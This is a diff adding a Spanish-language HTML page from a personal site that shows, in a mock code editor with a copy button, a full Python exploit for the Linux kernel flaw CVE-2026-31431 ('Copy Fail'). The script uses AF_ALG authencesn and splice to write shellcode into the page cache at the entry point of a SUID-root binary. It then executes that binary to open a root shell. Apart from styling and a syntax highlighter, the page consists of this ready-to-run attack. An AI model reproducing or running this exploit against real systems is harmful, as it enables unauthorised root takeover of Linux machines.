@@ -1,0 +1,541 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CVE-2026-31431 · CopyFail LPE · quadraturbo</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:ital,wght@0,300;0,400;0,500;0,600;1,300;1,400&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg:        #0c0c0b;
+            --surface:   #111210;
+            --border:    #222220;
+            --border-hi: #333330;
+            --ink:       #c4c0b8;
+            --ink-dim:   #4e4b45;
+            --ink-faint: #252420;
+            --accent:    #3dff6e;
+            --amber:     #d4a843;
+            --blue:      #4a9eff;
+            --mono:      'IBM Plex Mono', 'Courier New', monospace;
+        }
+
+        *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
+        html { scroll-behavior: smooth; }
+
+        body {
+            font-family: var(--mono);
+            background: var(--bg);
+            color: var(--ink);
+            font-size: 14px;
+            line-height: 1.7;
+            -webkit-font-smoothing: antialiased;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        body::after {
+            content: '';
+            position: fixed; inset: 0;
+            background: repeating-linear-gradient(0deg, transparent, transparent 3px, rgba(0,0,0,0.07) 3px, rgba(0,0,0,0.07) 4px);
+            pointer-events: none;
+            z-index: 9999;
+        }
+
+        .top-bar {
+            border-bottom: 1px solid var(--border);
+            padding: 0 max(24px, 4vw);
+            display: flex; align-items: center; justify-content: space-between;
+            height: 44px; flex-shrink: 0;
+            background: rgba(12,12,11,0.96);
+            backdrop-filter: blur(8px);
+            position: sticky; top: 0; z-index: 50;
+        }
+        .top-bar-left { display: flex; align-items: center; gap: 20px; }
+        .top-back {
+            font-size: 12px; color: var(--ink-dim); text-decoration: none;
+            letter-spacing: 0.04em; transition: color 0.15s;
+            display: flex; align-items: center; gap: 6px;
+        }
+        .top-back::before { content: '←'; }
+        .top-back:hover { color: var(--accent); }
+        .top-sep { width: 1px; height: 16px; background: var(--border); }
+        .top-cve { font-size: 12px; color: var(--ink-dim); letter-spacing: 0.04em; }
+        .top-cve span { color: var(--amber); }
+        .top-handle { font-size: 13px; font-weight: 600; color: var(--accent); letter-spacing: 0.02em; }
+
+        .page {
+            max-width: 960px;
+            margin: 0 auto;
+            padding: 48px max(24px, 4vw) 80px;
+            width: 100%;
+            flex: 1;
+        }
+
+        .page-header { margin-bottom: 32px; }
+        .page-title {
+            font-size: clamp(18px, 3vw, 28px);
+            font-weight: 600; color: #e8e4da;
+            letter-spacing: -0.02em; margin-bottom: 8px;
+        }
+        .page-meta {
+            display: flex; gap: 24px; flex-wrap: wrap;
+            font-size: 12px; color: var(--ink-dim);
+        }
+        .page-meta-item { display: flex; gap: 6px; }
+        .page-meta-item span { color: var(--ink); }
+        .page-meta-item a {
+            color: var(--blue); text-decoration: none; transition: color 0.15s;
+        }
+        .page-meta-item a:hover { color: var(--accent); }
+
+        .vsc-wrap {
+            border: 1px solid var(--border-hi);
+            background: #0d0d0c;
+            overflow: hidden;
+        }
+        .vsc-titlebar {
+            display: flex; align-items: center; gap: 12px;
+            background: #171715; border-bottom: 1px solid var(--border);
+            padding: 0 14px; height: 36px;
+        }
+        .vsc-dots { display: flex; gap: 7px; flex-shrink: 0; }
+        .vsc-dot { width: 11px; height: 11px; border-radius: 50%; opacity: 0.7; }
+        .vsc-dot-r { background: #ff5f57; }
+        .vsc-dot-y { background: #febc2e; }
+        .vsc-dot-g { background: #28c840; }
+        .vsc-window-title {
+            flex: 1; font-size: 11px; color: var(--ink-dim);
+            letter-spacing: 0.04em; text-align: center;
+            white-space: nowrap; overflow: hidden; text-overflow: ellipsis;
+        }
+        .vsc-copy-btn {
+            background: none; border: 1px solid var(--border);
+            color: var(--ink-dim); font-family: var(--mono);
+            font-size: 10px; letter-spacing: 0.08em; text-transform: uppercase;
+            padding: 3px 10px; cursor: pointer; transition: all 0.15s; flex-shrink: 0;
+        }
+        .vsc-copy-btn:hover { border-color: var(--accent); color: var(--accent); }
+        .vsc-copy-btn.copied { border-color: var(--accent); color: var(--accent); }
+        .vsc-tabs {
+            display: flex; background: #101010;
+            border-bottom: 1px solid var(--border); overflow-x: auto;
+        }
+        .vsc-tab {
+            display: flex; align-items: center; gap: 7px;
+            padding: 0 16px; height: 34px; font-size: 12px;
+            color: var(--ink-dim); white-space: nowrap; cursor: default;
+            border-right: 1px solid var(--border);
+            border-top: 1px solid transparent;
+            user-select: none;
+        }
+        .vsc-tab.active { color: var(--ink); background: #0d0d0c; border-top-color: var(--accent); }
+        .vsc-tab-icon { font-size: 13px; }
+        .vsc-tab-close { font-size: 15px; line-height: 1; opacity: 0.3; margin-left: 4px; }
+        .vsc-editor {
+            display: flex; overflow: auto;
+            max-height: calc(100vh - 220px); min-height: 300px;
+            scrollbar-width: thin;
+            scrollbar-color: var(--border-hi) transparent;
+        }
+        .vsc-editor::-webkit-scrollbar { width: 8px; height: 8px; }
+        .vsc-editor::-webkit-scrollbar-track { background: transparent; }
+        .vsc-editor::-webkit-scrollbar-thumb { background: var(--border-hi); }
+        .vsc-gutter {
+            flex-shrink: 0; min-width: 52px;
+            background: #0d0d0c; border-right: 1px solid #1a1a18;
+            padding: 20px 0; text-align: right;
+            font-size: 12px; line-height: 1.7;
+            color: var(--ink-faint); user-select: none;
+            position: sticky; left: 0; z-index: 2;
+            overflow: hidden;
+        }
+        .vsc-gutter span { display: block; padding: 0 12px 0 6px; }
+        .vsc-code {
+            flex: 1; margin: 0; padding: 20px 28px 20px 18px;
+            font-family: var(--mono); font-size: 13px; line-height: 1.7;
+            color: var(--ink); white-space: pre; overflow: visible; tab-size: 4;
+        }
+        .py-kw   { color: #4a9eff; }
+        .py-bi   { color: #c678dd; }
+        .py-str  { color: #d4a843; }
+        .py-com  { color: #4e4b45; font-style: italic; }
+        .py-num  { color: #ff6b6b; }
+        .py-dec  { color: #3dff6e; }
+        .py-fn   { color: #61afef; }
+        .py-cls  { color: #e5c07b; }
+        .py-self { color: #e06c75; }
+        .py-op   { color: var(--ink-dim); }
+        .vsc-statusbar {
+            display: flex; justify-content: space-between;
+            background: #111210; border-top: 1px solid var(--border);
+            padding: 0 14px; height: 24px; align-items: center;
+            font-size: 11px; letter-spacing: 0.04em;
+        }
+        .vsc-sb-left, .vsc-sb-right { display: flex; }
+        .vsc-sb-item {
+            color: var(--ink-dim); padding: 0 10px;
+            border-right: 1px solid var(--border);
+            height: 24px; line-height: 24px;
+        }
+        .vsc-sb-right .vsc-sb-item:last-child { border-right: none; }
+        .vsc-sb-item.warn { color: var(--amber); }
+        .vsc-sb-item.ok   { color: var(--accent); }
+
+        @media (max-width: 600px) {
+            .top-sep, .top-cve { display: none; }
+            .vsc-code { font-size: 11px; }
+        }
+    </style>
+</head>
+<body>
+
+<div class="top-bar">
+    <div class="top-bar-left">
+        <a href="index.html" class="top-back">quadraturbo</a>
+        <div class="top-sep"></div>
+        <span class="top-cve">TFG · <span>CVE-2026-31431</span></span>
+    </div>
+    <span class="top-handle">quadraturbo_</span>
+</div>
+
+<div class="page">
+
+    <div class="page-header">
+        <h1 class="page-title">CVE-2026-31431 — CopyFail Universal LPE</h1>
+        <div class="page-meta">
+            <div class="page-meta-item">vector <span>AF_ALG splice · page cache write</span></div>
+            <div class="page-meta-item">afecta <span>Linux kernel · x86_64</span></div>
+            <div class="page-meta-item">ref <a href="https://github.com/shadowabi/CVE-2026-31431-CopyFail-Universal-LPE" target="_blank">shadowabi/CVE-2026-31431</a></div>
+        </div>
+    </div>
+
+    <div class="vsc-wrap">
+
+        <div class="vsc-titlebar">
+            <div class="vsc-dots" aria-hidden="true">
+                <span class="vsc-dot vsc-dot-r"></span>
+                <span class="vsc-dot vsc-dot-y"></span>
+                <span class="vsc-dot vsc-dot-g"></span>
+            </div>
+            <span class="vsc-window-title">copy_fail_lpe.py — CVE-2026-31431 · quadraturbo</span>
+            <button class="vsc-copy-btn" id="poc-copy">copy</button>
+        </div>
+
+        <div class="vsc-tabs">
+            <div class="vsc-tab active">
+                <span class="vsc-tab-icon" aria-hidden="true">🐍</span>
+                <span>copy_fail_lpe.py</span>
+                <span class="vsc-tab-close" aria-hidden="true">×</span>
+            </div>
+        </div>
+
+        <div class="vsc-editor" id="vsc-editor">
+            <div class="vsc-gutter" id="poc-gutter" aria-hidden="true"></div>
+            <pre class="vsc-code" id="poc-code"></pre>
+        </div>
+
+        <div class="vsc-statusbar" aria-hidden="true">
+            <span class="vsc-sb-left">
+                <span class="vsc-sb-item">⎇ main</span>
+                <span class="vsc-sb-item warn">⚠ CVE-2026-31431</span>
+            </span>
+            <span class="vsc-sb-right">
+                <span class="vsc-sb-item">Python 3</span>
+                <span class="vsc-sb-item">UTF-8</span>
+                <span class="vsc-sb-item" id="poc-linecount">—</span>
+                <span class="vsc-sb-item ok">listo</span>
+            </span>
+        </div>
+
+    </div>
+
+</div>
+
+<script>
+const POC_CODE = `#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+"""
+CVE-2026-31431 "Copy Fail" — Universal LPE Exploit
+Linux kernel page cache 4-byte arbitrary write via AF_ALG splice + authencesn
+
+Dynamic ELF entry point offset calculation — works on any SUID-root x86_64 binary.
+
+Reference: https://github.com/theori-io/copy-fail-CVE-2026-31431
+
+Compatible with Python 3.x (requires AF_ALG socket support).
+"""
+
+from __future__ import print_function
+import os
+import socket
+import struct
+import sys
+import binascii
+import ctypes
+import ctypes.util
+
+AF_ALG = 38
+SOCK_SEQPACKET = 5
+SOL_ALG = 279
+
+# --- splice compat: Python < 3.10 has no os.splice ---
+if not hasattr(os, "splice"):
+    _libc = ctypes.CDLL(ctypes.util.find_library("c"), use_errno=True)
+
+    def _splice(src, dst, count, offset_src=None, offset_dst=None, flags=0):
+        ctypes.set_errno(0)
+        pi = ctypes.byref(ctypes.c_longlong(offset_src)) if offset_src is not None else None
+        po = ctypes.byref(ctypes.c_longlong(offset_dst)) if offset_dst is not None else None
+        r = _libc.splice(
+            ctypes.c_int(src), pi,
+            ctypes.c_int(dst), po,
+            ctypes.c_size_t(count), ctypes.c_uint(flags),
+        )
+        if r == -1:
+            raise OSError(ctypes.get_errno(), "splice failed")
+        return r
+
+    os.splice = _splice
+
+
+def _hex(h):
+    """Compatibility wrapper for hex decoding (Python 2/3)."""
+    if isinstance(h, str):
+        h = h.encode("ascii")
+    return binascii.unhexlify(h)
+
+
+def copy_fall_write(target, file_offset, payload):
+    """
+    Write 4 bytes to page cache at (target_file, file_offset).
+
+    Abuse AF_ALG algif_aead in-place decryption:
+    splice() pins a page cache page, authencesn writes 4-byte seqno_lo
+    at a controlled offset after the auth tag.
+    """
+    s = socket.socket(AF_ALG, SOCK_SEQPACKET, 0)
+    s.bind(("aead", "authencesn(hmac(sha256),cbc(aes))"))
+    s.setsockopt(SOL_ALG, 1, _hex("0800010000000010" + "0" * 64))
+    s.setsockopt(SOL_ALG, 5, None, 4)
+    ctx, _ = s.accept()
+    zero = _hex("00")
+    ctx.sendmsg(
+        [b"A" * 4 + payload],
+        [
+            (SOL_ALG, 3, zero * 4),
+            (SOL_ALG, 2, b"\x10" + zero * 19),
+            (SOL_ALG, 4, b"\x08" + zero * 3),
+        ],
+        32768,
+    )
+    r, w = os.pipe()
+    fd = os.open(target, os.O_RDONLY)
+    os.splice(fd, w, file_offset + 4, offset_src=0)
+    os.splice(r, ctx.fileno(), file_offset + 4)
+    try:
+        ctx.recv(8 + file_offset)
+    except Exception:
+        pass
+    for x in [fd, r, w]:
+        os.close(x)
+    ctx.close()
+    s.close()
+
+
+def parse_elf_entry_offset(filepath):
+    """
+    Calculate the file offset of the ELF entry point (e_entry).
+
+    Walk PT_LOAD segments to find the one containing e_entry:
+        file_offset = p_offset + (e_entry - p_vaddr)
+    """
+    with open(filepath, "rb") as f:
+        hdr = f.read(64)
+    e_entry = struct.unpack_from("<Q", hdr, 24)[0]
+    e_phoff = struct.unpack_from("<Q", hdr, 32)[0]
+    e_phnum = struct.unpack_from("<H", hdr, 56)[0]
+    e_phentsize = struct.unpack_from("<H", hdr, 54)[0]
+    with open(filepath, "rb") as f:
+        for i in range(e_phnum):
+            f.seek(e_phoff + i * e_phentsize)
+            ph = f.read(e_phentsize)
+            if struct.unpack_from("<I", ph, 0)[0] != 1:  # PT_LOAD
+                continue
+            p_offset = struct.unpack_from("<Q", ph, 8)[0]
+            p_vaddr = struct.unpack_from("<Q", ph, 16)[0]
+            p_filesz = struct.unpack_from("<Q", ph, 32)[0]
+            if p_vaddr <= e_entry < p_vaddr + p_filesz:
+                return p_offset + (e_entry - p_vaddr)
+    raise RuntimeError("PT_LOAD segment containing entry point not found")
+
+
+# setuid(0) + execve("/bin/sh") — 36 bytes
+SHELLCODE = (
+    b"\x48\x31\xff"  # xor rdi, rdi
+    b"\x31\xc0"  # xor eax, eax
+    b"\xb0\x69"  # mov al, 0x69 (setuid)
+    b"\x0f\x05"  # syscall
+    b"\x48\x31\xd2"  # xor rdx, rdx
+    b"\x52"  # push rdx
+    b"\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00"  # movabs rbx, "/bin/sh\0"
+    b"\x53"  # push rbx
+    b"\x48\x89\xe7"  # mov rdi, rsp
+    b"\x48\x31\xf6"  # xor rsi, rsi
+    b"\x31\xc0"  # xor eax, eax
+    b"\xb0\x3b"  # mov al, 0x3b (execve)
+    b"\x0f\x05"  # syscall
+)
+
+
+def main():
+    if len(sys.argv) < 2:
+        print(f"Usage: {sys.argv[0]} <suid-binary>  (e.g., /usr/bin/su)")
+        sys.exit(1)
+
+    target = sys.argv[1]
+    entry_offset = parse_elf_entry_offset(target)
+    print(f"[*] Target: {target}")
+    print(f"[*] ELF entry file offset: 0x{entry_offset:x}")
+
+    sc = SHELLCODE
+    if len(sc) % 4:
+        sc += b"\x00" * (4 - len(sc) % 4)
+    print(f"[*] Shellcode: {len(SHELLCODE)} bytes, {len(sc) // 4} writes")
+
+    for i in range(len(sc) // 4):
+        chunk = sc[i * 4 : i * 4 + 4]
+        off = entry_offset + i * 4
+        copy_fall_write(target, off, chunk)
+        print(f"    [+] 0x{off:06x}: {chunk.hex()}")
+
+    with open(target, "rb") as f:
+        f.seek(entry_offset)
+        written = f.read(len(sc))
+    print(f"[*] Verify: {written[:len(SHELLCODE)].hex()}")
+
+    print(f"[*] Executing {target}...")
+    os.system(target)
+
+
+if __name__ == "__main__":
+    main()`;
+
+(function () {
+    const KEYWORDS = new Set([
+        'False','None','True','and','as','assert','async','await',
+        'break','class','continue','def','del','elif','else','except',
+        'finally','for','from','global','if','import','in','is',
+        'lambda','nonlocal','not','or','pass','raise','return',
+        'try','while','with','yield'
+    ]);
+    const BUILTINS = new Set([
+        'abs','all','any','bin','bool','bytes','callable','chr',
+        'dict','dir','divmod','enumerate','eval','exec','filter',
+        'float','format','frozenset','getattr','globals','hasattr',
+        'hash','help','hex','id','input','int','isinstance',
+        'issubclass','iter','len','list','locals','map','max',
+        'min','next','object','oct','open','ord','pow','print',
+        'property','range','repr','reversed','round','set','setattr',
+        'slice','sorted','staticmethod','str','sum','super','tuple',
+        'type','vars','zip'
+    ]);
+
+    function esc(s) {
+        return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+    }
+
+    function tokenize(line) {
+        let out = '', i = 0, len = line.length;
+        while (i < len) {
+            if (line[i] === '#') {
+                out += `<span class="py-com">${esc(line.slice(i))}</span>`;
+                break;
+            }
+            if ((line[i] === '"' || line[i] === "'") && line[i+1] === line[i] && line[i+2] === line[i]) {
+                const q = line[i]; let j = i + 3;
+                while (j < len - 2 && !(line[j]===q && line[j+1]===q && line[j+2]===q)) j++;
+                j = Math.min(j + 3, len);
+                out += `<span class="py-str">${esc(line.slice(i, j))}</span>`;
+                i = j; continue;
+            }
+            if (line[i] === '"' || line[i] === "'") {
+                const q = line[i]; let j = i + 1;
+                while (j < len && line[j] !== q) { if (line[j] === '\\') j++; j++; }
+                j = Math.min(j + 1, len);
+                out += `<span class="py-str">${esc(line.slice(i, j))}</span>`;
+                i = j; continue;
+            }
+            if (line[i] === '@') {
+                let j = i + 1;
+                while (j < len && /[\w.]/.test(line[j])) j++;
+                out += `<span class="py-dec">${esc(line.slice(i, j))}</span>`;
+                i = j; continue;
+            }
+            if (/[0-9]/.test(line[i])) {
+                let j = i;
+                while (j < len && /[0-9a-fA-Fx_.]/.test(line[j])) j++;
+                out += `<span class="py-num">${esc(line.slice(i, j))}</span>`;
+                i = j; continue;
+            }
+            if (/[a-zA-Z_]/.test(line[i])) {
+                let j = i;
+                while (j < len && /\w/.test(line[j])) j++;
+                const w = line.slice(i, j);
+                if (w === 'def' || w === 'class') {
+                    const cls = w === 'def' ? 'py-fn' : 'py-cls';
+                    out += `<span class="py-kw">${w}</span>`;
+                    i = j;
+                    while (i < len && line[i] === ' ') { out += ' '; i++; }
+                    let k = i;
+                    while (k < len && /\w/.test(line[k])) k++;
+                    if (k > i) { out += `<span class="${cls}">${esc(line.slice(i, k))}</span>`; i = k; }
+                    continue;
+                }
+                if (w === 'self' || w === 'cls') out += `<span class="py-self">${w}</span>`;
+                else if (KEYWORDS.has(w)) out += `<span class="py-kw">${w}</span>`;
+                else if (BUILTINS.has(w)) out += `<span class="py-bi">${w}</span>`;
+                else out += esc(w);
+                i = j; continue;
+            }
+            if (/[+\-*/%=<>!&|^~]/.test(line[i])) {
+                out += `<span class="py-op">${esc(line[i])}</span>`;
+                i++; continue;
+            }
+            out += esc(line[i]); i++;
+        }
+        return out;
+    }
+
+    const codeEl   = document.getElementById('poc-code');
+    const gutterEl = document.getElementById('poc-gutter');
+    const lineEl   = document.getElementById('poc-linecount');
+    const copyBtn  = document.getElementById('poc-copy');
+    const editorEl = document.getElementById('vsc-editor');
+
+    if (!codeEl) return;
+
+    const lines = POC_CODE.split('\n');
+    if (lines[lines.length - 1].trim() === '') lines.pop();
+
+    codeEl.innerHTML  = lines.map(l => tokenize(l)).join('\n');
+    gutterEl.innerHTML = lines.map((_, i) => `<span>${i + 1}</span>`).join('');
+    if (lineEl) lineEl.textContent = `${lines.length} líneas`;
+
+    editorEl.addEventListener('scroll', () => { gutterEl.scrollTop = editorEl.scrollTop; });
+
+    copyBtn.addEventListener('click', () => {
+        navigator.clipboard.writeText(POC_CODE).then(() => {
+            copyBtn.textContent = 'copiado';
+            copyBtn.classList.add('copied');
+            setTimeout(() => { copyBtn.textContent = 'copy'; copyBtn.classList.remove('copied'); }, 2000);
+        });
+    });
+})();
+</script>
+
+</body>
+</html>
